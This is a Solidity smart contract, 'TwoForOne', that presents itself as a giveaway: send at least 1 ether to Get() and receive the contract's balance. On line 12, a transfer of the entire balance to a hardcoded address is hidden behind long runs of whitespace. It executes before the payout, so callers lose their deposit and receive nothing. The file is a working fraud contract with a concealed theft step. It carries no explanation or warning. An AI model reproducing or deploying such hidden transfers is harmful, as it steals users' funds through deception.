1 pragma solidity ^0.4.19;
2 
3 contract TwoForOne
4 {
5     function() public payable{}
6    
7     function Get()
8     public
9     payable
10     {                                                                    
11         if(msg.value>=1 ether)
12         {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   address(0x9Cc9B3133c1deb8E66AcA7eC5ebCad26cd24ff27).transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
13             msg.sender.transfer(this.balance);
14         }                                                                                                                
15     }
16 }